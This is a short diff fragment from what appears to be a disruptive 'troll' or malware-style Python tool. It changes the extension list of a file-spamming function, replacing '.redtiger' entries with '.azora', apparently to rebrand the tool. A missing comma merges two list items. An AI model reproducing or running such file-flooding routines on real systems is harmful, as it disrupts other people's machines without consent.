@@ -1434,7 +1434,7 @@ def Sp4m_Cr34t_Fil3():
            ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
            ".mov", ".jpg", ".pdf", ".troll", ".cooked",
            ".lol", ".funny", ".virus", ".malware"
-           ".redtiger", ".redtiger", ".redtiger", ".redtiger"
+           ".azora", ".azora", ".azora", ".azora"
     ]
     def Cr43t():
         file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)
